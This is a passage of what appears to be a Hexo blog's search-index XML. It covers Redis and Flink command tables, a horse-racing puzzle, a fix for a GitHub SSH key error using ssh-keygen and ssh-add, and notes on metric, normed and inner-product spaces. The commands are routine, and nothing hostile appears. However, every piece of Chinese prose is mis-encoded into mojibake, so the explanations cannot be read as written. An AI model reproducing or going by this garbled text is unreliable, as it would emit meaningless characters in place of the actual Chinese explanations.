(ä»å·¦åˆ°å³)</td></tr><tr><td>llen</td><td>è·å¾—åˆ—è¡¨é•¿åº¦</td></tr><tr><td>linsert Â  before</td><td>åœ¨çš„åé¢æ’å…¥ æ’å…¥å€¼</td></tr><tr><td>lrem</td><td>ä»å·¦è¾¹åˆ é™¤nä¸ªvalue(ä»å·¦åˆ°å³)</td></tr></tbody></table><h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><table><thead><tr><th>å‘½ä»¤</th><th>åŠŸèƒ½è¯´æ˜</th></tr></thead><tbody><tr><td>sadd Â  Â  Â â€¦.</td><td>å°†ä¸€ä¸ªæˆ–å¤šä¸ª member å…ƒç´ åŠ å…¥åˆ°é›†åˆ key å½“ä¸­ï¼Œå·²ç»å­˜åœ¨äºé›†åˆçš„ member å…ƒç´ å°†è¢«å¿½ç•¥ã€‚</td></tr><tr><td>smembers</td><td>å–å‡ºè¯¥é›†åˆçš„æ‰€æœ‰å€¼ã€‚</td></tr><tr><td>sismember</td><td>åˆ¤æ–­é›†åˆæ˜¯å¦ä¸ºå«æœ‰è¯¥å€¼ï¼Œæœ‰è¿”å›1ï¼Œæ²¡æœ‰è¿”å›0</td></tr><tr><td>scard</td><td>è¿”å›è¯¥é›†åˆçš„å…ƒç´ ä¸ªæ•°ã€‚</td></tr><tr><td>srem Â  Â â€¦.</td><td>åˆ é™¤é›†åˆä¸­çš„æŸä¸ªå…ƒç´ ã€‚</td></tr><tr><td>spop</td><td>éšæœºä»è¯¥é›†åˆä¸­åå‡ºä¸€ä¸ªå€¼ã€‚</td></tr><tr><td>srandmember</td><td>éšæœºä»è¯¥é›†åˆä¸­å–å‡ºnä¸ªå€¼ã€‚ä¸ä¼šä»é›†åˆä¸­åˆ é™¤</td></tr><tr><td>sinter</td><td>è¿”å›ä¸¤ä¸ªé›†åˆçš„äº¤é›†å…ƒç´ ã€‚</td></tr><tr><td>sunion</td><td>è¿”å›ä¸¤ä¸ªé›†åˆçš„å¹¶é›†å…ƒç´ ã€‚</td></tr><tr><td>sdiff</td><td>è¿”å›ä¸¤ä¸ªé›†åˆçš„å·®é›†å…ƒç´ ã€‚</td></tr></tbody></table><h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h3><table><thead><tr><th>å‘½ä»¤</th><th>åŠŸèƒ½è¯´æ˜</th></tr></thead><tbody><tr><td>hset</td><td>ç»™é›†åˆä¸­çš„ Â é”®èµ‹å€¼</td></tr><tr><td>hget</td><td>ä»é›†åˆ å–å‡º value</td></tr><tr><td>hmset Â  Â  Â â€¦</td><td>æ‰¹é‡è®¾ç½®hashçš„å€¼</td></tr><tr><td>hexists key</td><td>æŸ¥çœ‹å“ˆå¸Œè¡¨ key ä¸­ï¼Œç»™å®šåŸŸ field æ˜¯å¦å­˜åœ¨ã€‚</td></tr><tr><td>hkeys</td><td>åˆ—å‡ºè¯¥hashé›†åˆçš„æ‰€æœ‰field</td></tr><tr><td>hvals</td><td>åˆ—å‡ºè¯¥hashé›†åˆçš„æ‰€æœ‰value</td></tr><tr><td>hincrby</td><td>ä¸ºå“ˆå¸Œè¡¨ key ä¸­çš„åŸŸ field çš„å€¼åŠ ä¸Šå¢é‡ increment</td></tr><tr><td>hsetnx</td><td>å°†å“ˆå¸Œè¡¨ key ä¸­çš„åŸŸ field çš„å€¼è®¾ç½®ä¸º value ï¼Œå½“ä¸”ä»…å½“åŸŸ field ä¸å­˜åœ¨</td></tr></tbody></table><h3 id="zset-Sorted-set"><a href="#zset-Sorted-set" class="headerlink" title="zset(Sorted set)"></a>zset(Sorted set)</h3><table><thead><tr><th>å‘½ä»¤</th><th>åŠŸèƒ½è¯´æ˜</th></tr></thead><tbody><tr><td>zadd Â  Â  Â  â€¦</td><td>å°†ä¸€ä¸ªæˆ–å¤šä¸ª member å…ƒç´ åŠå…¶ score å€¼åŠ å…¥åˆ°æœ‰åºé›† key å½“ä¸­</td></tr><tr><td>zrange Â  Â  Â [WITHSCORES]</td><td>è¿”å›æœ‰åºé›† key ä¸­ï¼Œä¸‹æ ‡åœ¨ ä¹‹é—´çš„å…ƒç´ å¸¦WITHSCORESï¼Œå¯ä»¥è®©åˆ†æ•°ä¸€èµ·å’Œå€¼è¿”å›åˆ°ç»“æœé›†ã€‚</td></tr><tr><td>zrangebyscore key min max [withscores] [limit offset count]</td><td>è¿”å›æœ‰åºé›† key ä¸­ï¼Œæ‰€æœ‰ score å€¼ä»‹äº min å’Œ max ä¹‹é—´(åŒ…æ‹¬ç­‰äº min æˆ– max )çš„æˆå‘˜ã€‚æœ‰åºé›†æˆå‘˜æŒ‰ score å€¼é€’å¢(ä»å°åˆ°å¤§)æ¬¡åºæ’åˆ—ã€‚</td></tr><tr><td>zrevrangebyscore key max min [withscores] [limit offset count]</td><td>åŒä¸Šï¼Œæ”¹ä¸ºä»å¤§åˆ°å°æ’åˆ—ã€‚</td></tr><tr><td>zincrby</td><td>ä¸ºå…ƒç´ çš„scoreåŠ ä¸Šå¢é‡</td></tr><tr><td>zrem</td><td>åˆ é™¤è¯¥é›†åˆä¸‹ï¼ŒæŒ‡å®šå€¼çš„å…ƒç´ </td></tr><tr><td>zcount</td><td>ç»Ÿè®¡è¯¥é›†åˆï¼Œåˆ†æ•°åŒºé—´å†…çš„å…ƒç´ ä¸ªæ•°</td></tr><tr><td>zrank</td><td>è¿”å›è¯¥å€¼åœ¨é›†åˆä¸­çš„æ’åï¼Œä»0å¼€å§‹ã€‚</td></tr></tbody></table><hr><h2 id="Flink"><a href="#Flink" class="headerlink" title="Flink"></a>Flink</h2><h3 id="å¯åŠ¨"><a href="#å¯åŠ¨" class="headerlink" title="å¯åŠ¨"></a>å¯åŠ¨</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./start-cluster.sh</span><br></pre></td></tr></table></figure><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./bin/flink run [OPTIONS]</span><br><span class="line"></span><br><span class="line">./bin/flink run -m yarn-cluster -c com.wang.flink.WordCount /opt/app/WordCount.jar</span><br></pre></td></tr></table></figure><table><thead><tr><th>OPTIONS</th><th>åŠŸèƒ½è¯´æ˜</th></tr></thead><tbody><tr><td>-d</td><td>detached æ˜¯å¦ä½¿ç”¨åˆ†ç¦»æ¨¡å¼</td></tr><tr><td>-m</td><td>jobmanager æŒ‡å®šæäº¤çš„jobmanager</td></tr><tr><td>-yat</td><td>â€“yarnapplicationType è®¾ç½®yarnåº”ç”¨çš„ç±»å‹</td></tr><tr><td>-yD</td><td>ä½¿ç”¨ç»™å®šå±æ€§çš„å€¼</td></tr><tr><td>-yd</td><td>â€“yarndetached ä½¿ç”¨yarnåˆ†ç¦»æ¨¡å¼</td></tr><tr><td>-yh</td><td>â€“yarnhelp yarn sessionçš„å¸®åŠ©</td></tr><tr><td>-yid</td><td>â€“yarnapplicationId æŒ‚åˆ°æ­£åœ¨è¿è¡Œçš„yarnsessionä¸Š</td></tr><tr><td>-yj</td><td>â€“yarnjar Flink jaræ–‡ä»¶çš„è·¯å¾„</td></tr><tr><td>-yjm</td><td>â€“yarnjobManagerMemory jobmanagerçš„å†…å­˜(å•ä½M)</td></tr><tr><td>-ynl</td><td>â€“yarnnodeLabel æŒ‡å®š YARN åº”ç”¨ç¨‹åº YARN èŠ‚ç‚¹æ ‡ç­¾</td></tr><tr><td>-ynm</td><td>â€“yarnname è‡ªå®šä¹‰yarnåº”ç”¨åç§°</td></tr><tr><td>-yq</td><td>â€“yarnquery æ˜¾ç¤ºyarnçš„å¯ç”¨èµ„æº</td></tr><tr><td>-yqu</td><td>â€“yarnqueue æŒ‡å®šyarné˜Ÿåˆ—</td></tr><tr><td>-ys</td><td>â€“yarnslots æŒ‡å®šæ¯ä¸ªtaskmanagerçš„slotsæ•°</td></tr><tr><td>-yt</td><td>yarnship åœ¨æŒ‡å®šç›®å½•ä¸­ä¼ è¾“æ–‡ä»¶</td></tr><tr><td>-ytm</td><td>â€“yarntaskManagerMemory æ¯ä¸ªtaskmanagerçš„å†…å­˜</td></tr><tr><td>-yz</td><td>â€“yarnzookeeperNamespace ç”¨æ¥åˆ›å»ºhaçš„zkå­è·¯å¾„çš„å‘½åç©ºé—´</td></tr><tr><td>-z</td><td>â€“zookeeperNamespace ç”¨æ¥åˆ›å»ºhaçš„zkå­è·¯å¾„çš„å‘½åç©ºé—´</td></tr><tr><td>-p</td><td>å¹¶è¡Œåº¦</td></tr><tr><td>-yn</td><td>éœ€è¦åˆ†é…çš„YARNå®¹å™¨ä¸ªæ•°(=ä»»åŠ¡ç®¡ç†å™¨çš„æ•°é‡)</td></tr></tbody></table><h3 id="info"><a href="#info" class="headerlink" title="info"></a>info</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/flink info [OPTIONS]</span><br></pre></td></tr></table></figure><table><thead><tr><th>OPTIONS</th><th>åŠŸèƒ½è¯´æ˜</th></tr></thead><tbody><tr><td>-c</td><td>ç¨‹åºè¿›å…¥ç‚¹ï¼Œä¸»ç±»</td></tr><tr><td>-p</td><td>å¹¶è¡Œåº¦</td></tr></tbody></table><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/flink list [OPTIONS]</span><br></pre></td></tr></table></figure><table><thead><tr><th>OPTIONS</th><th>åŠŸèƒ½è¯´æ˜</th></tr></thead><tbody><tr><td>-a</td><td>â€“all æ˜¾ç¤ºæ‰€æœ‰åº”ç”¨å’Œå¯¹åº”çš„job id</td></tr><tr><td>-r</td><td>â€“running æ˜¾ç¤ºæ­£åœ¨è¿è¡Œçš„åº”ç”¨å’Œjob id</td></tr><tr><td>-s</td><td>â€“scheduled æ˜¾ç¤ºè°ƒåº¦çš„åº”ç”¨å’Œjob id</td></tr><tr><td>-m</td><td>â€“jobmanager æŒ‡å®šè¿æ¥çš„jobmanager</td></tr><tr><td>-yid</td><td>â€“yarnapplicationId æŒ‚åˆ°æŒ‡å®šçš„yarn idå¯¹åº”çš„yarn sessionä¸Š</td></tr><tr><td>-z</td><td>â€“zookeeperNamespace ç”¨æ¥åˆ›å»ºhaçš„zkå­è·¯å¾„çš„å‘½åç©ºé—´</td></tr></tbody></table><h3 id="stop"><a href="#stop" class="headerlink" title="stop"></a>stop</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/flink stop  [OPTIONS] &lt;Job ID&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>OPTIONS</th><th>åŠŸèƒ½è¯´æ˜</th></tr></thead><tbody><tr><td>-d</td><td>åœ¨é‡‡å–ä¿å­˜ç‚¹å’Œåœæ­¢ç®¡é“ä¹‹å‰ï¼Œå‘é€MAX_WATERMARK</td></tr><tr><td>-p</td><td>savepointPath ä¿å­˜ç‚¹çš„è·¯å¾„ â€˜xxxxxâ€™</td></tr><tr><td>-m</td><td>â€“jobmanager æŒ‡å®šè¿æ¥çš„jobmanager</td></tr><tr><td>-yid</td><td>â€“yarnapplicationId æŒ‚åˆ°æŒ‡å®šçš„yarn idå¯¹åº”çš„yarn sessionä¸Š</td></tr><tr><td>-z</td><td>â€“zookeeperNamespace ç”¨æ¥åˆ›å»ºhaçš„zkå­è·¯å¾„çš„å‘½åç©ºé—´</td></tr></tbody></table><h3 id="cancel-å¼±åŒ–"><a href="#cancel-å¼±åŒ–" class="headerlink" title="cancel(å¼±åŒ–)"></a>cancel(å¼±åŒ–)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/flink cancel  [OPTIONS] &lt;Job ID&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>OPTIONS</th><th>åŠŸèƒ½è¯´æ˜</th></tr></thead><tbody><tr><td>-s</td><td>ä½¿ç”¨ â€œstop â€œä»£æ›¿</td></tr><tr><td>-D</td><td>å…è®¸æŒ‡å®šå¤šä¸ªé€šç”¨é…ç½®é€‰é¡¹</td></tr><tr><td>-m</td><td>è¦è¿æ¥çš„JobManagerçš„åœ°å€</td></tr><tr><td>-yid</td><td>â€“yarnapplicationId æŒ‚åˆ°æŒ‡å®šçš„yarn idå¯¹åº”çš„yarn sessionä¸Š</td></tr><tr><td>-z</td><td>â€“zookeeperNamespace ç”¨æ¥åˆ›å»ºhaçš„zkå­è·¯å¾„çš„å‘½åç©ºé—´</td></tr></tbody></table><h3 id="savepoint"><a href="#savepoint" class="headerlink" title="savepoint"></a>savepoint</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/flink savepoint  [OPTIONS] &lt;Job ID&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>OPTIONS</th><th>åŠŸèƒ½è¯´æ˜</th></tr></thead><tbody><tr><td>-d</td><td>è¦å¤„ç†çš„ä¿å­˜ç‚¹çš„è·¯å¾„</td></tr><tr><td>-j</td><td>Flinkç¨‹åºçš„JARæ–‡ä»¶</td></tr><tr><td>-m</td><td>è¦è¿æ¥çš„JobManagerçš„åœ°å€</td></tr><tr><td>-yid</td><td>â€“yarnapplicationId æŒ‚åˆ°æŒ‡å®šçš„yarn idå¯¹åº”çš„yarn sessionä¸Š</td></tr><tr><td>-z</td><td>â€“zookeeperNamespace ç”¨æ¥åˆ›å»ºhaçš„zkå­è·¯å¾„çš„å‘½åç©ºé—´</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> BIGDATA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bigdata </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ™ºåŠ›é¢˜ä¹‹èµ›é©¬é—®é¢˜</title>
      <link href="/2021/11/02/%E6%99%BA%E5%8A%9B%E9%A2%98%E4%B9%8B%E8%B5%9B%E9%A9%AC%E9%97%AE%E9%A2%98/"/>
      <url>/2021/11/02/%E6%99%BA%E5%8A%9B%E9%A2%98%E4%B9%8B%E8%B5%9B%E9%A9%AC%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<iframe src="//player.bilibili.com/player.html?bvid=BV1KJ411g78y&cid=118835090&page=1&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><h2 id="èµ›é©¬é—®é¢˜"><a href="#èµ›é©¬é—®é¢˜" class="headerlink" title="èµ›é©¬é—®é¢˜"></a>èµ›é©¬é—®é¢˜</h2><h3 id="64åŒ¹é©¬8ä¸ªè·‘é“"><a href="#64åŒ¹é©¬8ä¸ªè·‘é“" class="headerlink" title="64åŒ¹é©¬8ä¸ªè·‘é“"></a>64åŒ¹é©¬8ä¸ªè·‘é“</h3><p>64åŒ¹é©¬8ä¸ªè·‘é“ï¼ˆä¸è®¡æ—¶ï¼‰ï¼Œé—®æœ€å°‘è¦æ¯”å¤šå°‘æ¬¡ï¼Œæ‰èƒ½çŸ¥é“æœ€å¿«çš„4åŒ¹é©¬<br><img src="https://snowgo.top/medias/medias/%E6%99%BA%E5%8A%9B%E9%A2%98%E4%B9%8B%E8%B5%9B%E9%A9%AC%E9%97%AE%E9%A2%98/0.png"><br>â€‹</p><p>é¦–å…ˆè¦èµ›8+1åœºï¼Œå¾—åˆ°ä¸Šè¡¨ä¸­çš„ç›¸å¯¹é¡ºåº<br>A1&gt;A2&gt;â€¦&gt;A8<br>B1&gt;B2&gt;â€¦&gt;B8<br>â€¦<br>H1&gt;H2&gt;â€¦&gt;H8<br>A1&gt;B1&gt;â€¦&gt;H1<br>â€‹</p><p>å¯ä»¥çŸ¥é“ç¬¬ä¸€åå·²ç»ç¡®å®šäº†ï¼Œç¬¬2-4ååªå¯èƒ½åœ¨çº¢è‰²åŒºåŸŸå‡ºç°ï¼ˆå¦‚ï¼šD2&lt;D1&lt;C1&lt;B1&lt;A1,æ‰€ä»¥D2ä¸€å®šä¸æ˜¯å‰å››ï¼‰<br>â€‹</p><p>çº¢è‰²åŒºåŸŸå…±æœ‰9åŒ¹é©¬ï¼Œå–å‡ºA2ï¼Œè®©å‰©ä¸‹8åŒ¹é©¬èµ›ä¸€åœºï¼Œå¦‚æœA3ç¬¬ä¸€ï¼Œåˆ™å‰4å·²ç»ç¡®å®šäº†å…±8+1+1=10åœºï¼Œå¦‚æœA3ä¸æ˜¯ç¬¬ä¸€ï¼Œåˆ™è¿˜éœ€è¦è®©è¿™ä¸€åœºçš„å‰ä¸‰åå’ŒA2èµ›ä¸€åœºï¼Œå…±8+1+1+1=11åœº<br>â€‹</p><p>æ‰€ä»¥æœ€å°‘10åœºï¼Œæœ€å¤š11åœº</p><h3 id="36åŒ¹é©¬6ä¸ªè·‘é“"><a href="#36åŒ¹é©¬6ä¸ªè·‘é“" class="headerlink" title="36åŒ¹é©¬6ä¸ªè·‘é“"></a>36åŒ¹é©¬6ä¸ªè·‘é“</h3><p><img src="https://snowgo.top/medias/medias/%E6%99%BA%E5%8A%9B%E9%A2%98%E4%B9%8B%E8%B5%9B%E9%A9%AC%E9%97%AE%E9%A2%98/1.png"><br>å…ˆèµ›6 + 1åœºå¾—åˆ°ä¸Šè¡¨<br>ç„¶åè®©çº¢è‰²åŒºåŸŸå†èµ›ä¸€åœºå°±å¯ä»¥ç¡®å®šå‰ä¸‰åäº†<br>â€‹</p><p>æ‰€ä»¥å…±6 + 1 + 1 = 8åœº<br>â€‹</p><p>åŒç†<br>25åŒ¹é©¬5èµ›é“ï¼Œèµ›å‡ºå‰3å<br>éœ€è¦5 + 1 + 1 = 7åœº</p><blockquote><p><a href="https://blog.csdn.net/qq_43827595/article/details/104154641">https://blog.csdn.net/qq_43827595/article/details/104154641</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> INTERESTING </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ™ºåŠ›é¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Githubé…ç½®SSH-keyæ—¶å‡ºç°Permission-denied(publickey)</title>
      <link href="/2021/11/01/Github%E9%85%8D%E7%BD%AESSH-key%E6%97%B6%E5%87%BA%E7%8E%B0Permission-denied(publickey)/"/>
      <url>/2021/11/01/Github%E9%85%8D%E7%BD%AESSH-key%E6%97%B6%E5%87%BA%E7%8E%B0Permission-denied(publickey)/</url>
      
        <content type="html"><![CDATA[<p>æƒ…å†µæ¯”å…¶ä»–åšä¸»é‡åˆ°çš„æ›´ä¸ºå¤æ‚ï¼ŒæŸ¥é˜…äº†ä¼—å¤šèµ„æ–™æœ€ç»ˆæ‰å¾—ä»¥è§£å†³</p><h2 id="ç¬¬ä¸€æ¬¡å°è¯•"><a href="#ç¬¬ä¸€æ¬¡å°è¯•" class="headerlink" title="ç¬¬ä¸€æ¬¡å°è¯•"></a>ç¬¬ä¸€æ¬¡å°è¯•</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;627136120@qq.com&quot;</span><br></pre></td></tr></table></figure><p>é‡æ–°ç”Ÿæˆå…¬é’¥å’Œç§é’¥ï¼Œå…¬é’¥æäº¤åˆ°githubä¸Šï¼Œå¤±è´¥</p><h2 id="ç¬¬äºŒæ¬¡å°è¯•"><a href="#ç¬¬äºŒæ¬¡å°è¯•" class="headerlink" title="ç¬¬äºŒæ¬¡å°è¯•"></a>ç¬¬äºŒæ¬¡å°è¯•</h2><p>æŸ¥é˜…githubå®˜æ–¹ç»™å‡ºçš„è§£å†³æ–¹æ¡ˆ<br><a href="https://docs.github.com/en/authentication/troubleshooting-ssh/error-permission-denied-publickey">https://docs.github.com/en/authentication/troubleshooting-ssh/error-permission-denied-publickey</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-add -l -E sha256</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å…¬é’¥æŒ‡çº¹ï¼Œè¾“å‡ºä¸º<br>The agent has no identities.<br>æ‰¾åˆ°äº†é—®é¢˜çš„çªç ´å£</p><h2 id="ç¬¬ä¸‰æ¬¡å°è¯•"><a href="#ç¬¬ä¸‰æ¬¡å°è¯•" class="headerlink" title="ç¬¬ä¸‰æ¬¡å°è¯•"></a>ç¬¬ä¸‰æ¬¡å°è¯•</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-add /users/sketchzero/.ssh/id_rsa</span><br></pre></td></tr></table></figure><p>æ·»åŠ å…¬é’¥æŒ‡çº¹<br>æ­¤æ—¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-add -l -E sha256</span><br></pre></td></tr></table></figure><p>æ­£å¸¸è¾“å‡ºäº†å…¬é’¥æŒ‡çº¹</p><h2 id="é—®é¢˜è§£å†³"><a href="#é—®é¢˜è§£å†³" class="headerlink" title="é—®é¢˜è§£å†³"></a>é—®é¢˜è§£å†³</h2><p><img src="https://snowgo.top/medias/medias/Github%E9%85%8D%E7%BD%AESSH-key%E6%97%B6%E5%87%BA%E7%8E%B0Permission-denied(publickey)/0.png"><br><img src="https://snowgo.top/medias/medias/Github%E9%85%8D%E7%BD%AESSH-key%E6%97%B6%E5%87%BA%E7%8E%B0Permission-denied(publickey)/1.png"><br>æ¯”å¯¹å…¬é’¥æŒ‡çº¹ï¼Œå‘ç°æ²¡æœ‰é—®é¢˜<br><img src="https://snowgo.top/medias/medias/Github%E9%85%8D%E7%BD%AESSH-key%E6%97%B6%E5%87%BA%E7%8E%B0Permission-denied(publickey)/2.png"><br>æˆåŠŸï¼</p>]]></content>
      
      
      <categories>
          
          <category> GIT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºå‡½æ•°ç©ºé—´çš„ç®€å•ç†è§£</title>
      <link href="/2021/10/15/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E7%A9%BA%E9%97%B4%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/"/>
      <url>/2021/10/15/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E7%A9%BA%E9%97%B4%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>å›´æ£‹å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªç©ºé—´ï¼Œåœ¨å¾®ç§¯åˆ†é‡Œå¯ä»¥å®šä¹‰æé™å’Œè¿ç»­ï¼Œä¾èµ–äº<strong>è·ç¦»</strong></p><h3 id="å‘é‡çš„è·ç¦»"><a href="#å‘é‡çš„è·ç¦»" class="headerlink" title="å‘é‡çš„è·ç¦»"></a>å‘é‡çš„è·ç¦»</h3><p><img src="https://snowgo.top/medias/medias/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E7%A9%BA%E9%97%B4%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/0.png"></p><h3 id="å‡½æ•°çš„è·ç¦»"><a href="#å‡½æ•°çš„è·ç¦»" class="headerlink" title="å‡½æ•°çš„è·ç¦»"></a>å‡½æ•°çš„è·ç¦»<img src="https://snowgo.top/medias/medias/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E7%A9%BA%E9%97%B4%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/1.png"></h3><h3 id="è·ç¦»çš„å®šä¹‰"><a href="#è·ç¦»çš„å®šä¹‰" class="headerlink" title="è·ç¦»çš„å®šä¹‰"></a>è·ç¦»çš„å®šä¹‰</h3><p><img src="https://snowgo.top/medias/medias/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E7%A9%BA%E9%97%B4%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/2.png"></p><h3 id="çº¿æ€§ç©ºé—´"><a href="#çº¿æ€§ç©ºé—´" class="headerlink" title="çº¿æ€§ç©ºé—´"></a>çº¿æ€§ç©ºé—´</h3><p><img src="https://snowgo.top/medias/medias/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E7%A9%BA%E9%97%B4%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/3.png"><br>ä¸ºäº†åˆ›é€ ä¸€ä¸ªâ€œå·¥ä½œå¹³å°â€ï¼Œé™¤äº†è·ç¦»å’Œçº¿æ€§ç©ºé—´ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å†åŠ ä¸€ç‚¹ä»€ä¹ˆå‘¢ã€‚ï¼ˆä¹Ÿå°±æ˜¯ï¼Œæ°´æœ-ã€‹çƒ­å¸¦æ°´æœã€‚</p><h3 id="èŒƒæ•°"><a href="#èŒƒæ•°" class="headerlink" title="èŒƒæ•°"></a>èŒƒæ•°</h3><p><img src="https://snowgo.top/medias/medias/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E7%A9%BA%E9%97%B4%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/4.png"><br>è·ç¦»å¯ä»¥å®šä¹‰èŒƒæ•°ï¼Œä½†æ˜¯èŒƒæ•°ä¸èƒ½å®šä¹‰è·ç¦»ã€‚ï¼ˆç±»æ¯”è·ç¦»ï¼ˆæ°´æœï¼‰ èŒƒæ•°ï¼ˆçƒ­å¸¦æ°´æœï¼‰ï¼‰</p><p>èµ‹äºˆèŒƒæ•°æˆ–è€…è·ç¦»çš„é›†åˆåˆ†åˆ«ç§°ä¸ºï¼š<strong>èµ‹èŒƒç©ºé—´</strong>å’Œ<strong>åº¦é‡ç©ºé—´</strong>ï¼›<br>è‹¥åœ¨å…¶ä¸Šå†åŠ ä¸Šçº¿æ€§ç»“æ„ç§°ä¸º<strong>çº¿æ€§èµ‹èŒƒç©ºé—´</strong>å’Œ<strong>çº¿æ€§åº¦é‡ç©ºé—´</strong>ã€‚<br>â€‹</p><p>é‚£ä¹ˆã€‚èµ‹èŒƒç©ºé—´æœ‰å‘é‡çš„æ¨¡é•¿ï¼Œå³èŒƒæ•°ã€‚ä½†æ˜¯è¿˜ç¼ºä¹ä¸€ä¸ªå¾ˆé‡è¦çš„æ¦‚å¿µ-ä¸¤ä¸ªå‘é‡çš„å¤¹è§’ã€‚ä¸ºå…‹æœè¿™ä¸€ç¼ºé™·ï¼Œæˆ‘ä»¬å¼•å…¥<strong>å†…ç§¯</strong></p><h3 id="å†…ç§¯ç©ºé—´"><a href="#å†…ç§¯ç©ºé—´" class="headerlink" title="å†…ç§¯ç©ºé—´"></a>å†…ç§¯ç©ºé—´</h3><p><img src="https://snowgo.top/medias/medias/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E7%A9%BA%E9%97%B4%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/5.png"><br>å†…ç§¯ï¼šï¼ˆxï¼Œyï¼‰<br>çº¿æ€§æ€§ï¼šä¹Ÿå°±æ˜¯å¯¹ç¬¬ä¸€ä¸ªå˜å…ƒå¦‚æœä¹˜aï¼Œè¿™ä¸ªaå¯ä»¥æå‡ºæ¥ï¼Œå°±è·Ÿåˆšæ‰çš„èŒƒæ•°çš„è¿™ä¸ªä¸œè¥¿æœ‰ç‚¹ç±»ä¼¼äº†ï¼Œä½†æ˜¯å®ƒæ˜¯å¯¹ç¬¬ä¸€ä¸ªï¼ˆå˜å…ƒï¼‰<br>æ­£å®šï¼šå¤§äºç­‰äº0<br><img src="https://snowgo.top/medias/medias/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E7%A9%BA%E9%97%B4%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/6.png"><br>å†…ç§¯å¯ä»¥å¯¼å‡ºèŒƒæ•°<br><img src="https://snowgo.top/medias/medias/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E7%A9%BA%E9%97%B4%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/7.png"><br>æˆ‘ä»¬æ—¥å¸¸ç”Ÿæ´»ä¸­çš„é—®é¢˜å¤§éƒ½å¯ä»¥å†æ¬§å‡ é‡Œå¾—ç©ºé—´å†…è§£å†³ã€‚</p><h3 id="å¸Œå°”ä¼¯ç‰¹ç©ºé—´å’Œå·´æ‹¿èµ«ç©ºé—´"><a href="#å¸Œå°”ä¼¯ç‰¹ç©ºé—´å’Œå·´æ‹¿èµ«ç©ºé—´" class="headerlink" title="å¸Œå°”ä¼¯ç‰¹ç©ºé—´å’Œå·´æ‹¿èµ«ç©ºé—´"></a>å¸Œå°”ä¼¯ç‰¹ç©ºé—´å’Œå·´æ‹¿èµ«ç©ºé—´</h3><p><img 